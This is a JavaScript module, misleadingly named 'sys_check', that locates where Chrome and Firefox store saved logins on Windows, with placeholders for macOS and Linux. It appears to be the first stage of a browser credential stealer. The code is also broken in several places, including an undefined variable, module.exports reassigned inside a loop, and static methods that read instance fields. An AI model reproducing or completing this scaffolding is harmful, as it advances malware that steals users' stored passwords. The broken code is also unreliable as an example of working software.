const local = process.env.LOCALAPPDATA,
	roaming = process.env.ROAMINGAPPDATA,
	fs = require('fs'),
		p = require('path'),
	chrome_win = p.join(
		local,
		"Google",
		"Chrome",
		"User Data",
		"Default",
		"Login Data"
	),
	fire_win = p.join(
		roaming,
		"Mozilla",
		"Firefox",
		"Profiles" 
	);

module.exports = class sys_check {
	constructor() {
		for (const folder of pass_path_win_2) {
		module.exports = f = (() => {
			fs.readdirSync(folder);
		});
		}
		this.win32_validBrowsers = [
			[/chrome/, `${chrome_win}/Loginvault.db`],
			[/firefox/, `${fire_win}/${f[0]}/logins.json`],
			[/internet explorer/, "internetExplorer path"],
			[/edge/, "edge path" ],
			[/etc/, "NOTE: Find a way to deep-scan for other browsers"]
		];

		this.macOS_validBrowsers = [
			[/chrome/, "chrome path"],
			[/firefox/, "firefox path"],
			[/safari/, "safari path"],
			[/etc/, "NOTE: Find a way to deep-scan for other browsers"]
		]

		this.linux_validBrowsers = [
			[/chrome/, "chrome path"],
			[/firefox/, "firefox path"],
			[/etc/, "NOTE: Find a way to deep-scan for other browsers"]
		]
	};
	/**
	 * @param {String} browser
	 * @returns 
	 */
	static async win32(browser) {
		if (!browser) throw new Error("No browser specified");
		const foundBrowser = this.win32_validBrowsers.find(v => new RegExp(v[0], 'i').test(browser)).then(console.log);
		if(!foundBrowser)
			throw Error("Invalid Browser Input");
		if(!fs.existsSync(foundBrowser[1]))
			throw Error("Browser Not Found >:3");
		if (!!fs.existsSync(foundBrowser[1]))
			return foundBrowser[1];
	};

	static async macOS(browser) {
		if (!browser) throw new Error("No browser specified");
		const foundBrowser = this.macOS_validBrowsers.find(v => new RegExp(v[0], 'i').test(browser));
		if(!foundBrowser)
			throw Error("Invalid Browser Input");
		if(!fs.existsSync(foundBrowser[1]))
			throw Error("Browser Not Found >:3");
	}

	static async linux(browser) {
		if (!browser) throw new Error("No browser specified");
		const foundBrowser = this.linux_validBrowsers.find(v => new RegExp(v[0], 'i').test(browser));
		if(!foundBrowser)
			throw Error("Invalid Browser Input");
		if(!fs.existsSync(foundBrowser[1]))
			throw Error("Browser Not Found >:3");
	}
}
